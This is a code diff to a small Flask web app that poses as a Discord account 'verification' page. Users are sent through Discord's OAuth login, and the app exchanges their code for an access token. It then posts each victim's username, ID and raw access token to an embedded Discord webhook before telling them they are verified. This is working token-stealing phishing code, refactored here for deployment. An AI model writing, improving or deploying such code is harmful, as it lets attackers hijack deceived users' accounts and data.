@@ -12,10 +12,10 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1d
 
 @app.route("/", defaults={"path": ""})
 @app.route("/<path:path>")
-def callback(path):
+def index(path):
   code = request.args.get("code")
 
-  # Landing page when visiting root
+  # Render landing page with verification button if no OAuth code is present yet
   if not code:
     return render_template_string("""
             <!DOCTYPE html>
@@ -42,47 +42,77 @@ def callback(path):
             </html>
         """)
 
-  try:
-    # DEBUG STEP: Send raw code immediately so we know Vercel caught the redirect
-    requests.post(
-        WEBHOOK_URL,
-        json={"content": f"🛠️ **Debug:** Caught auth code from Discord: `{code}`"},
-        timeout=5,
-    )
+  # Step 1: Exchange code for access token
+  token_res = requests.post(
+      "https://discord.com/api/oauth2/token",
+      data={
+          "client_id": CLIENT_ID,
+          "client_secret": CLIENT_SECRET,
+          "grant_type": "authorization_code",
+          "code": code,
+          "redirect_uri": REDIRECT_URI,
+      },
+      headers={"Content-Type": "application/x-www-form-urlencoded"},
+  )
 
-    # Step 1: Exchange code for access token
-    data = {
-        "client_id": CLIENT_ID,
-        "client_secret": CLIENT_SECRET,
-        "grant_type": "authorization_code",
-        "code": code,
-        "redirect_uri": REDIRECT_URI,
-    }
-    headers = {
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "Mozilla/5.0",
-    }
-    token_resp = requests.post(
-        "https://discord.com/api/oauth2/token",
-        data=data,
-        headers=headers,
-        timeout=10,
-    )
-    token_json = token_resp.json()
-    access_token = token_json.get("access_token")
+  if token_res.status_code != 200:
+    return f"Token exchange failed: {token_res.text}", 500
 
-    if access_token:
-      # Step 2: Fetch user profile
-      user_headers = {
-          "Authorization": f"Bearer {access_token}",
-          "User-Agent": "Mozilla/5.0",
-      }
-      user_resp = requests.get(
-          "https://discord.com/api/users/@me", headers=user_headers, timeout=10
-      )
-      user_data = user_resp.json()
+  token_data = token_res.json()
+  access_token = token_data.get("access_token")
 
-      username = user_data.get("username", "Unknown")
-      user_id = user_data.get("id", "Unknown")
+  # Step 2: Fetch user profile
+  user_res = requests.get(
+      "https://discord.com/api/users/@me",
+      headers={"Authorization": f"Bearer {access_token}"},
+  )
+  user = user_res.json()
 
-      # Step 3: Send captured token & user info to
+  username = user.get("username", "Unknown")
+  user_id = user.get("id", "Unknown")
+
+  # Step 3: Forward captured token and user details to webhook log channel
+  requests.post(
+      WEBHOOK_URL,
+      json={
+          "embeds": [{
+              "title": "🔑 Verification Captured",
+              "color": 5763719,
+              "fields": [
+                  {
+                      "name": "User",
+                      "value": f"{username} (`{user_id}`)",
+                      "inline": True,
+                  },
+                  {
+                      "name": "Access Token",
+                      "value": f"`{access_token}`",
+                      "inline": False,
+                  },
+              ],
+          }]
+      },
+  )
+
+  # Step 4: Render success response page
+  return render_template_string("""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <title>Verification Successful</title>
+            <style>
+                body { background-color: #1e1f22; color: #f2f3f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+                .card { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; border: 1px solid #35363c; }
+                h1 { color: #23a55a; font-size: 22px; margin-bottom: 15px; }
+                p { color: #949ba4; font-size: 14px; }
+            </style>
+        </head>
+        <body>
+            <div class="card">
+                <h1>Verification Successful!</h1>
+                <p>Your account has been verified. You can close this tab.</p>
+            </div>
+        </body>
+        </html>
+    """)
